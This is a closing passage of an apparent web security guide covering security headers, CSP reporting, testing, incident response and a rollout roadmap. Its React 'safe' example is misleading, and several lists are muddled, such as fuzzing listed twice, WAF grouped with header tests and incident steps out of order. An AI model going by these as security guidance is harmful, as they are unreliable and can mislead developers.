      userAgent: request.headers["user-agent"],
      ip: getClientIP(request),
    }),
  )
}
```

**CSP Violation Reporting:**

```javascript
window.addEventListener("securitypolicyviolation", (e) => {
  logSecurityEvent("CSP_VIOLATION", {
    violatedDirective: e.violatedDirective,
    blockedURI: e.blockedURI,
    documentURI: e.documentURI,
  })
})
```

### Framework-Specific Security

**Next.js Security:**

```javascript
// next.config.js
const nextConfig = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          {
            key: "Strict-Transport-Security",
            value: "max-age=31536000; includeSubDomains; preload",
          },
          {
            key: "X-Content-Type-Options",
            value: "nosniff",
          },
          {
            key: "Referrer-Policy",
            value: "strict-origin-when-cross-origin",
          },
          {
            key: "X-Frame-Options",
            value: "DENY",
          },
        ],
      },
    ]
  },
}
```

**React Security:**

```javascript
// Avoid dangerous patterns
// ❌ Unsafe
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ✅ Safe
<div>{DOMPurify.sanitize(userContent)}</div>
```

### Performance and Security Balance

Security measures should not significantly impact application performance:

**Optimization Strategies:**

- Cache security headers where appropriate
- Use efficient CSP implementations
- Optimize nonce generation and validation
- Minimize header overhead

**Monitoring:**

- Track security header performance impact
- Monitor CSP violation rates
- Measure authentication flow latency
- Assess dependency scanning overhead

## Security Testing and Validation

**Purpose:** Verify that security measures are working as intended and identify vulnerabilities.

**Testing Types:**

- **Static Analysis:** Linting, code review, dependency scanning
- **Dynamic Analysis:** Penetration testing, fuzzing, fuzz testing
- **Vulnerability Scanning:** OWASP ZAP, Burp Suite, Nmap
- **Security Headers Testing:** WAF, CSP, X-Frame-Options

**Best Practices:**

- **Thorough Testing:** Cover all attack vectors
- **Regular Updates:** Keep testing tools and frameworks up-to-date
- **Automated:** Integrate testing into CI/CD pipeline
- **Manual:** Perform thorough manual testing for critical paths

## Incident Response and Recovery

**Purpose:** Respond to and recover from security incidents efficiently.

**Incident Response Process:**

1. **Detection:** Security monitoring alerts trigger incident response
2. **Isolation:** Contain the incident to minimize impact
3. **Identification:** Determine the root cause and scope
4. **Containment:** Apply fixes and patches
5. **Eradication:** Remove malicious code and data
6. **Recovery:** Restore normal operations
7. **Post-Incident:** Analyze incident, update policies, improve processes

**Incident Reporting:**

```javascript
const incidentReport = {
  timestamp: new Date().toISOString(),
  incidentId: "INC-2023-001",
  severity: "High",
  description: "Cross-Site Scripting (XSS) vulnerability in user profile section",
  affectedResources: ["/user/profile"],
  rootCause: "Missing input validation on user profile update",
  remediation: "Implement input sanitization and validation for user profile updates",
  impact: "Users could inject malicious JavaScript into their profile, potentially stealing session cookies",
  notes: "This vulnerability was discovered during a routine security audit.",
}
```

**Recovery Plan:**

```javascript
const recoveryPlan = {
  backup: {
    databases: ["primary", "replica"],
    storage: ["S3", "local"],
    frequency: "daily",
  },
  infrastructure: {
    services: ["web", "api", "database"],
    regions: ["us-east", "eu-west"],
    status: "operational",
  },
  monitoring: {
    alerts: ["slack", "pagerduty"],
    dashboards: ["splunk", "grafana"],
    frequency: "real-time",
  },
}
```

## Conclusion

Web application security is a complex, multi-faceted discipline that requires a comprehensive understanding of threats, vulnerabilities, and defensive strategies. This guide has covered the complete spectrum of web security, from foundational principles to advanced implementation techniques.

### Key Takeaways

1. **Security is a Process, Not a Product:** Security must be integrated throughout the entire software development lifecycle, from design to deployment and maintenance.

2. **Defense in Depth:** No single security control is infallible. Implement multiple layers of security controls to create robust defenses.

3. **Principle of Least Privilege:** Always grant the minimum necessary permissions and access rights to users, processes, and systems.

4. **Fail Securely:** Systems should default to secure states and handle errors gracefully without exposing vulnerabilities.

5. **Continuous Monitoring:** Implement comprehensive logging, monitoring, and incident response capabilities to detect and respond to threats.

### Implementation Roadmap

**Phase 1: Foundation (Weeks 1-2)**

- Implement essential security headers (CSP, HSTS, X-Frame-Options)
- Set up HTTPS enforcement and secure cookie configuration
- Establish basic input validation and output encoding

**Phase 2: Authentication & Authorization (Weeks 3-4)**

- Implement secure authentication with proper password hashing
- Set up role-based access control (RBAC)
- Configure session management and CSRF protection

**Phase 3: Advanced Security (Weeks 5-6)**

- Deploy Content Security Policy with nonce-based validation
- Implement comprehensive logging and monitoring
- Set up automated security testing in CI/CD pipeline

**Phase 4: Monitoring & Response (Weeks 7-8)**

- Deploy Web Application Firewall (WAF)
- Establish incident response procedures
- Implement threat intelligence integration

### Security Metrics and KPIs

Track these key security metrics to measure your security posture:

```javascript
const securityMetrics = {
  // Vulnerability metrics
  vulnerabilities: {
    critical: 0,
    high: 0,
    medium: 0,
    low: 0,
  },

  // Security testing metrics
  testing: {
    codeCoverage: 85, // Percentage
    securityTestsPassed: 100, // Percentage
    penetrationTestsPassed: 100, // Percentage
  },

  // Incident metrics
  incidents: {
    totalIncidents: 0,
    meanTimeToDetection: "2 hours",
    meanTimeToResolution: "4 hours",
    falsePositiveRate: 5, // Percentage
  },

  // Compliance metrics
  compliance: {
    securityHeaders: 100, // Percentage implemented
    encryptionAtRest: 100, // Percentage
    encryptionInTransit: 100, // Percentage
  },
}
```

### Continuous Improvement

Security is not a one-time implementation but an ongoing process of improvement:

1. **Regular Security Assessments:** Conduct quarterly security audits and penetration tests
2. **Threat Intelligence:** Stay current with emerging threats and attack techniques
3. **Security Training:** Provide regular security training for development teams
4. **Incident Response:** Practice incident response procedures regularly
5. **Security Automation:** Automate security testing and monitoring where possible

### Tools and Resources

**Security Testing Tools:**

- OWASP ZAP for automated security testing
- Burp Suite for manual penetration testing
- Snyk for dependency vulnerability scanning
- SonarQube for code quality and security analysis

**Security Headers Testing:**

- Security Headers (securityheaders.com)
- Mozilla Observatory (observatory.mozilla.org)
- SSL Labs (ssllabs.com)

**Threat Intelligence:**

- OWASP Top 10
- CVE database
- Security advisories from framework vendors
- Threat intelligence feeds

### Final Thoughts

Building secure web applications requires a combination of technical expertise, security awareness, and continuous vigilance. The threats facing web applications are constantly evolving, and security measures must evolve alongside them.

Remember that security is not about achieving perfection—it's about implementing reasonable measures that make your application significantly more secure than the average target. By following the principles and practices outlined in this guide, you can build web applications that are resilient to the most common attack vectors and capable of withstanding sophisticated threats.

The investment in security today pays dividends in the form of reduced risk, increased user trust, and protection against potentially catastrophic breaches. Start with the foundational principles, implement security measures incrementally, and continuously improve your security posture based on lessons learned and emerging threats.

**Security is everyone's responsibility.** From developers writing code to operations teams deploying applications, every member of your organization plays a role in maintaining security. By fostering a security-first culture and implementing the comprehensive security measures described in this guide, you can build web applications that are not only functional and user-friendly but also secure and resilient in the face of an ever-evolving threat landscape.

The journey to comprehensive web security is ongoing, but with the right approach, tools, and mindset, you can create applications that protect your users, your data, and your organization from the myriad threats that exist in today's digital world.
